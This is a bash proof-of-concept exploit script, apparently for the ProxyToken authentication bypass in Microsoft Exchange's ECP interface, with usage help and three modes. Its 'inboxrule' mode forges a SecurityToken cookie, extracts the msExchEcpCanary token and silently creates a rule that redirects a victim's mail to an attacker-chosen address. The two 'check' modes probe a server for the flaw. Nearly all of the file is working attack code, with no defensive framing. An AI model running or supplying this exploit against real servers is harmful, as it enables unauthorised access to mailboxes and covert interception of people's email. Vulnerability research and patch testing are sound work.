#!/bin/bash

while getopts ":v:t:s:h:m:" opt; do
  case $opt in
    s) serveraddress="$OPTARG"
    ;;
    v) victimemail="$OPTARG"
    ;;
    t) targetemail="$OPTARG"
    ;;
    h) help1="$OPTARG"
    ;;
    m) mode="$OPTARG"
    ;;
  esac
done

if [ ! -z "$help1" ] ; then
	echo "./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>"
	exit
fi

if [ "$mode" = "inboxrule" ] ; then

	if [ -z "$victimemail" ] || [ -z "$targetemail" ] || [ -z "$serveraddress" ] ; then
		echo "./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>"
		exit
	fi


msexchecpcanary=`curl -k "https://$serveraddress/ecp/RulesEditor/InboxRules.svc/NewObject" -H "Cookie: SecurityToken=x" -d "1" -v 2>&1| grep "msExchEcpCanary"|awk -F "msExchEcpCanary=" '{print$2}'|awk -F "; " '{print$1}'`

if [ -z "$msexchecpcanary" ] ; then

msexchecpcanary=`curl "https://$serveraddress/ecp/$victimemail/PersonalSettings/HomePage.aspx?showhelp=false" -H "Cookie: SecurityToken=x" -k -v 2>&1| grep "msExchEcpCanary"|awk -F "msExchEcpCanary=" '{print$2}'|awk -F "; " '{print$1}'`

fi

result=`curl -k "https://$serveraddress/ecp/$victimemail/RulesEditor/InboxRules.svc/NewObject?msExchEcpCanary=$msexchecpcanary" -H "Content-Type: application/json; charset=utf-8" -H "Cookie: SecurityToken=x" -d "{\"properties\":{\"RedirectTo\":[{\"RawIdentity\":\"$targetemail\",\"DisplayName\":\"$targetemail\",\"Address\":\"$targetemail\",\"AddressOrigin\":0,\"galContactGuid\":null,\"RecipientFlag\":0,\"RoutingType\":\"SMTP\",\"SMTPAddress\":\"$targetemail\"}],\"Name\":\"Test\",\"StopProcessingRules\":true}}" 2>&1 | grep "New-InboxRule"|wc -l`

if [ "$result" -gt 0 ] ; then
	echo "Inbox rule added successfully"
else
	echo "Request Failed"
fi
fi

if [ "$mode" = "check"  ] ; then


	if [ -z "$victimemail" ] || [ -z "$serveraddress" ] ; then
		echo "./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>"
		exit
	fi

	result=`curl "https://$serveraddress/ecp/$victimemail/PersonalSettings/HomePage.aspx?showhelp=false" -H "Cookie: SecurityToken=x" -k -v 2>&1| grep "my account - Outlook Web App"|wc -l`

	if [ "$result" -gt 0 ] ; then
		echo "$serveraddress is vulnerable"
	else
		echo "$serveraddress is not vulnerable"
	fi

fi


if [ "$mode" = "newcheck"  ] ; then


	if [ -z "$serveraddress" ] ; then
		echo "./proxytoken.sh -m <Mode> -s <Exchange Server IP>"
		exit
	fi
	
	result=`curl "https://$serveraddress/ecp/12312313123/PersonalSettings/HomePage.aspx?showhelp=false" -H "Cookie: SecurityToken=x" -k -v 2>&1| grep "Sign Out"|wc -l`

	if [ "$result" -gt 0 ] ; then
		echo "$serveraddress is vulnerable"
	else
		echo "$serveraddress is not vulnerable"
	fi

fi
